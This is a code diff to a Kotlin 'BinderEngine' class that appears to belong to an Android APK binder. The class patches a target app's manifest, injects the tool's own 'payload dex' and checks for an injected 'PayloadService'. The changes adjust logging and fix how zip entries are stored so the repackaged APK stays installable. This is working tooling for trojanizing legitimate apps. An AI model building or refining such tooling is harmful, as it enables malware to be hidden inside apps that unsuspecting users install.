@@ -80,6 +80,10 @@ class BinderEngine(private val ctx: Context) {
             } else {
                 emit(LogLevel.INFO, "Original package: " + originalInfo.packageName)
                 emit(LogLevel.INFO, "Original activities: " + (originalInfo.activities?.size ?: 0))
+                emit(
+                    LogLevel.INFO,
+                    "extractNativeLibs: " + (originalInfo.applicationInfo?.extractNativeLibs ?: true)
+                )
             }
 
             val srcZip = ZipFile(base)
@@ -88,9 +92,6 @@ class BinderEngine(private val ctx: Context) {
             val manifest = srcZip.getInputStream(manifestEntry).use { it.readBytes() }
 
             emit(LogLevel.INFO, "Original manifest: " + AxmlPatcher.stats(manifest))
-            if (AxmlPatcher.stats(manifest).contains("app=0")) {
-                emit(LogLevel.WARN, "No <application> in manifest -> this is a SPLIT apk")
-            }
 
             val originalApp = AxmlPatcher.readApplicationName(manifest)
             emit(LogLevel.INFO, "Original application: " + (originalApp ?: "(none)"))
@@ -109,7 +110,6 @@ class BinderEngine(private val ctx: Context) {
                 throw IllegalStateException("Manifest patch failed: " + (t.message ?: "unknown"))
             }
             emit(LogLevel.SUCCESS, "Manifest patched: " + manifest.size + " -> " + patched.size)
-            emit(LogLevel.INFO, "Patched manifest: " + AxmlPatcher.stats(patched))
 
             emit(LogLevel.INFO, "Collecting payload dex...")
             val dexes = collectOwnDex()
@@ -145,12 +145,14 @@ class BinderEngine(private val ctx: Context) {
 
                     val data = srcZip.getInputStream(e).use { it.readBytes() }
                     val entry = ZipEntry(e.name)
-                    if (e.name == "resources.arsc") {
+                    if (e.method == ZipEntry.STORED) {
                         entry.method = ZipEntry.STORED
                         entry.size = data.size.toLong()
                         entry.compressedSize = data.size.toLong()
                         entry.crc = CRC32().apply { update(data) }.value
-                    } else entry.method = ZipEntry.DEFLATED
+                    } else {
+                        entry.method = ZipEntry.DEFLATED
+                    }
                     zos.putNextEntry(entry)
                     zos.write(data)
                     zos.closeEntry()
@@ -205,7 +207,6 @@ class BinderEngine(private val ctx: Context) {
                 val srv = info.services?.mapNotNull { it.name } ?: emptyList()
                 val hasSrv = srv.any { it.endsWith("PayloadService") }
                 emit(if (hasSrv) LogLevel.SUCCESS else LogLevel.ERROR, "Payload service: " + hasSrv)
-                emit(LogLevel.INFO, "Activities: " + acts.joinToString(", "))
             }
 
             val cleanLabel = label.substringAfterLast('/')
